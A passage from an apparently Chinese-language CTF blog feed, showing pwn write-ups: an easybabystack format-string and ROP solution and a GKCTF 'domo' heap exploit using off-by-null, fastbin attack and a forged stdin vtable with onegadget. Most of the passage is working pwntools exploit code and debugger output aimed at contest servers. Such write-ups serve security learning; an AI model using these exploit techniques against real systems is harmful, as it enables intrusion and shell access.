<span class="keyword">print</span> i</span><br><span class="line">    payload=<span class="string">"\x00"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Secret: _____            #"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1254</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">        libc.address=leak-0x7fcb248f9690+0x7fcb2488a000</span></span><br><span class="line"><span class="string">        info("leak",leak)</span></span><br><span class="line"><span class="string">        info("libc",libc.address)</span></span><br><span class="line"><span class="string">        sleep(1)</span></span><br><span class="line"><span class="string">        p.recv()</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>这题比赛的时候也没做出来，参考fmyy师傅的题解</p><p> 格式化字符串中 *$连用表示取对应偏移位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span class="line">p= process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'%*18$d%5$n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x401512")</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x401733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401731</span></span><br><span class="line">binsh  =<span class="number">0x404090</span></span><br><span class="line">system = <span class="number">0x401110</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">gadget_I = <span class="number">0x40172A</span></span><br><span class="line">gadget_Ii = <span class="number">0x401710</span></span><br><span class="line">payload  = <span class="string">'U'</span>*<span class="number">0x118</span></span><br><span class="line">payload += p64(gadget_I)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(gadget_Ii)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'message'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;盲打1-盲打2&quot;&gt;&lt;a href=&quot;#盲打1-盲打2&quot; class=&quot;headerlink&quot; title=&quot;盲打1 盲打2&quot;&gt;&lt;/a&gt;盲打1 盲打2&lt;/h2&gt;&lt;p&gt;都是一个c语言解释器，但是不能用&lt;code&gt;()&lt;/code&gt;来写c语言，也就是不能调用函数，可以用
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/24/GKCTF-pwn-writeup/</id>
    <published>2020-05-24T10:04:51.000Z</published>
    <updated>2020-05-28T01:26:57.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><p>一道 domo日了一天，最后还是做出来，还是很高兴的</p><p><code>off-by-null</code>漏洞，edit功能有任意地址一字节写入，可以用来伪造堆块的size，<code>malloc_fook</code>和<code>free_hook</code>程序做有限制，然后又有<code>sanbox</code>。但是是在main函数结束的时候才生效的，只要在while循环里面调用<code>onegadget</code>，还是能反弹shell的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0xffffd8b6  <span class="keyword">if</span> (A == 0xffffd8b6) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><p>一开始的思路是想用 <code>environ</code>来泄露 <code>stack_addr</code>然后再申请堆块到栈上用<code>orw</code>的方式来做</p><p>然后费了好大的劲，泄露出stack的地址了，stack上没有合适的size而且还有麻烦的<code>canary</code></p><p>最后选择伪造 <code>_IO_2_1_stdin_</code>的<code>vtable</code>为heap地址，heap里面存放着<code>onegadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdin</span><br><span class="line">$1 = (struct _IO_FILE *) 0x7f991f79b8e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) 0x7f991f79b8e0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_read_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_write_end = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x557376e64010 &quot;96\n\n95634794904\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x557376e65010 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 16, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7f991f79d790 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f991f79b9c0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 113, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f991f79a6e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上是伪造 <code>_IO_file_jumps</code>结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_file_jumps</span><br><span class="line">$3 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x7f991f4509c0 &lt;_IO_new_file_finish&gt;, </span><br><span class="line">  __overflow = 0x7f991f451730 &lt;_IO_new_file_overflow&gt;, </span><br><span class="line">  __underflow = 0x7f991f4514a0 &lt;_IO_new_file_underflow&gt;, </span><br><span class="line">  __uflow = 0x7f991f452600 &lt;__GI__IO_default_uflow&gt;, </span><br><span class="line">  __pbackfail = 0x7f991f453980 &lt;__GI__IO_default_pbackfail&gt;, </span><br><span class="line">  __xsputn = 0x7f991f4501e0 &lt;_IO_new_file_xsputn&gt;, </span><br><span class="line">  __xsgetn = 0x7f991f44fec0 &lt;__GI__IO_file_xsgetn&gt;, </span><br><span class="line">  __seekoff = 0x7f991f44f4c0 &lt;_IO_new_file_seekoff&gt;, </span><br><span class="line">  __seekpos = 0x7f991f452a00 &lt;_IO_default_seekpos&gt;, </span><br><span class="line">  __setbuf = 0x7f991f44f430 &lt;_IO_new_file_setbuf&gt;, </span><br><span class="line">  __sync = 0x7f991f44f370 &lt;_IO_new_file_sync&gt;, </span><br><span class="line">  __doallocate = 0x7f991f444180 &lt;__GI__IO_file_doallocate&gt;, </span><br><span class="line">  __read = 0x7f991f4501a0 &lt;__GI__IO_file_read&gt;, </span><br><span class="line">  __write = 0x7f991f44fb70 &lt;_IO_new_file_write&gt;, </span><br><span class="line">  __seek = 0x7f991f44f970 &lt;__GI__IO_file_seek&gt;, </span><br><span class="line">  __close = 0x7f991f44f340 &lt;__GI__IO_file_close&gt;, </span><br><span class="line">  __stat = 0x7f991f44fb60 &lt;__GI__IO_file_stat&gt;, </span><br><span class="line">  __showmanyc = 0x7f991f453af0 &lt;_IO_default_showmanyc&gt;, </span><br><span class="line">  __imbue = 0x7f991f453b00 &lt;_IO_default_imbue&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先利用<code>unsortedbin_attack</code>泄露出libc基址和heap地址</p><p>然后 <code>off-by-null</code>溢出修改下一个堆块的 size 为 <code>\x00</code>使得他被修改为释放过的</p><p>通过布局，unlink使得堆块向前合并，造成堆块重叠，<code>fastbin_attack</code> 打<code>vtable</code>,需要用edit功能提前伪造size。</p><p><code>_IO_file_jumps</code>里面全放<code>onegadget</code>然后劫持程序执行流 ，生效的是<code>__xsputn</code>这里的<code>onegadget</code></p><p>看下puts函数的具体实现</p><p>代码来自：<a href="https://code.woboq.org/userspace/glibc/" target="_blank" rel="noopener">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/libio/" target="_blank" rel="noopener">libio</a>/<a href="https://code.woboq.org/userspace/glibc/libio/ioputs.c.html" target="_blank" rel="noopener">ioputs.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = EOF;</span><br><span class="line">  <span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里实际上是调用了<code>_IO_sputn</code>这个函数，当然这个<code>_IO_sputn</code>实际上就是一个宏，调用了<code>_IO_2_1_stdout_</code>的vtable中的<code>__xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">"environ"</span>]</span><br><span class="line">_IO_list_all=libc.address+<span class="number">0x7f97b2172520</span><span class="number">-0x7f97b1dad000</span></span><br><span class="line">io_stdin_vtable=libc.address+<span class="number">0x7f07aec479b0</span><span class="number">-0x7f07ae883000</span></span><br><span class="line">info(<span class="string">"environ"</span>,environ)</span><br><span class="line">info(<span class="string">"io_stdin_vtable"</span>,io_stdin_vtable)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + fake vtable-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(io_stdin_vtable<span class="number">-0x20</span>)) <span class="comment">#1</span></span><br><span class="line">edit(io_stdin_vtable<span class="number">-0x18</span>,<span class="string">"\x71"</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one[<span class="number">2</span>]+libc.address)*<span class="number">19</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0xffffffff</span>)+<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">add(0x120,'\x12'*0x100+p64(0x110)+p64(0x70)+p64(io_sdtout-0x43)) #1</span></span><br><span class="line"><span class="string">add(0x68,"\x17"*0x10) #</span></span><br><span class="line"><span class="string">payload='\x01'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,payload) #2</span></span><br><span class="line"><span class="string">dbg()</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p>赛后看了官方的writeup，预期解跟我刚开始的思路差不多，只不过攻击方式不同</p><p>他是先修改<code>_IO_2_1_stdout_</code>来实现泄露stack地址，</p><p>接着改写 <code>_IO_2_1_stdin_</code>来实现向stack上写ROP链</p><p>有一些细节，需要注意到。修改 <code>_IO_2_1_stdout_</code>泄露出栈地址后，<code>puts</code>函数输出的字符不会加换行符了</p><p>具体原因还不清楚，有知道的师傅可以交流一波</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 